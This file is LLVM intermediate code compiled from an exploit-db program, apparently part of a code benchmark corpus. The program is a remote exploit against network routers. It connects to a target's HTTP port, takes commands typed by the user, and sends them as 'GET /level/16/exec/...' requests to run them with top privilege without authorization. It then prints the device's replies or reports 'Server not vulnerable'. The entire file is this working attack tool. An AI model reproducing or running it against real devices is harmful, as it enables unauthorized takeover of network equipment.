; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_20976.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_20976.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"host()\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@HTTP_PORT = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"connect()\00", align 1
@PROMPT = common dso_local global i8* null, align 8
@stdin = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [35 x i8] c"GET /level/16/exec/%s HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"CR</A>\00", align 1
@.str.5 = private unnamed_addr constant [87 x i8] c"You need to complete the command with more parameters or finish the command with 'CR'\0A\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"Unauthorized\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c"Server not vulnerable\0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"Thanks...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [256 x i8], align 16
  %11 = alloca [512 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 2
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @usage(i8* %17)
  br label %19

19:                                               ; preds = %14, %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call %struct.hostent* @gethostbyname(i8* %22)
  store %struct.hostent* %23, %struct.hostent** %6, align 8
  %24 = icmp eq %struct.hostent* %23, null
  br i1 %24, label %25, label %28

25:                                               ; preds = %19
  %26 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %27 = call i32 @exit(i32 -1) #4
  unreachable

28:                                               ; preds = %19
  %29 = load i32, i32* @AF_INET, align 4
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %29, i32* %30, align 4
  %31 = load i32, i32* @HTTP_PORT, align 4
  %32 = call i32 @htons(i32 %31)
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %32, i32* %33, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %35 = load %struct.hostent*, %struct.hostent** %6, align 8
  %36 = getelementptr inbounds %struct.hostent, %struct.hostent* %35, i32 0, i32 0
  %37 = load i64, i64* %36, align 8
  %38 = inttoptr i64 %37 to %struct.in_addr*
  %39 = bitcast %struct.in_addr* %34 to i8*
  %40 = bitcast %struct.in_addr* %38 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %39, i8* align 4 %40, i64 4, i1 false)
  br label %41

41:                                               ; preds = %28, %126
  %42 = load i32, i32* @AF_INET, align 4
  %43 = load i32, i32* @SOCK_STREAM, align 4
  %44 = call i32 @socket(i32 %42, i32 %43, i32 6)
  store i32 %44, i32* %8, align 4
  %45 = icmp sle i32 %44, 0
  br i1 %45, label %46, label %49

46:                                               ; preds = %41
  %47 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %48 = call i32 @exit(i32 -1) #4
  unreachable

49:                                               ; preds = %41
  %50 = load i32, i32* %8, align 4
  %51 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %52 = call i64 @connect(i32 %50, %struct.sockaddr* %51, i32 12)
  %53 = icmp slt i64 %52, 0
  br i1 %53, label %54, label %57

54:                                               ; preds = %49
  %55 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %56 = call i32 @exit(i32 -1) #4
  unreachable

57:                                               ; preds = %49
  %58 = load i8*, i8** @PROMPT, align 8
  %59 = call i32 (i8*, ...) @printf(i8* %58)
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %61 = load i32, i32* @stdin, align 4
  %62 = call i32 @fgets(i8* %60, i32 256, i32 %61)
  %63 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %64 = call i32 @strlen(i8* %63)
  %65 = icmp eq i32 %64, 1
  br i1 %65, label %66, label %67

66:                                               ; preds = %57
  br label %127

67:                                               ; preds = %57
  store i32 0, i32* %9, align 4
  br label %68

68:                                               ; preds = %85, %67
  %69 = load i32, i32* %9, align 4
  %70 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %71 = call i32 @strlen(i8* %70)
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %88

73:                                               ; preds = %68
  %74 = load i32, i32* %9, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 %75
  %77 = load i8, i8* %76, align 1
  %78 = sext i8 %77 to i32
  %79 = icmp eq i32 %78, 32
  br i1 %79, label %80, label %84

80:                                               ; preds = %73
  %81 = load i32, i32* %9, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 %82
  store i8 47, i8* %83, align 1
  br label %84

84:                                               ; preds = %80, %73
  br label %85

85:                                               ; preds = %84
  %86 = load i32, i32* %9, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %9, align 4
  br label %68

88:                                               ; preds = %68
  %89 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %91 = call i32 @snprintf(i8* %89, i32 512, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0), i8* %90)
  %92 = load i32, i32* %8, align 4
  %93 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %94 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %95 = call i32 @strlen(i8* %94)
  %96 = call i32 @write(i32 %92, i8* %93, i32 %95)
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %98 = call i32 @memset(i8* %97, i32 0, i32 512)
  br label %99

99:                                               ; preds = %125, %88
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %102 = call i64 @read(i32 %100, i8* %101, i32 512)
  %103 = icmp ne i64 %102, 0
  br i1 %103, label %104, label %126

104:                                              ; preds = %99
  %105 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %106 = call i64 @strstr(i8* %105, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %107 = icmp ne i64 %106, 0
  br i1 %107, label %108, label %112

108:                                              ; preds = %104
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.5, i64 0, i64 0))
  %110 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %111 = call i32 @memset(i8* %110, i32 0, i32 512)
  br label %126

112:                                              ; preds = %104
  %113 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %114 = call i64 @strstr(i8* %113, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %115 = icmp ne i64 %114, 0
  br i1 %115, label %116, label %119

116:                                              ; preds = %112
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0))
  %118 = call i32 @exit(i32 -1) #4
  unreachable

119:                                              ; preds = %112
  %120 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* %120)
  %122 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i64 0, i64 0
  %123 = call i32 @memset(i8* %122, i32 0, i32 512)
  br label %124

124:                                              ; preds = %119
  br label %125

125:                                              ; preds = %124
  br label %99

126:                                              ; preds = %108, %99
  br label %41

127:                                              ; preds = %66
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i64 0, i64 0))
  %129 = call i32 @exit(i32 0) #4
  unreachable
}

declare dso_local i32 @usage(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fgets(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
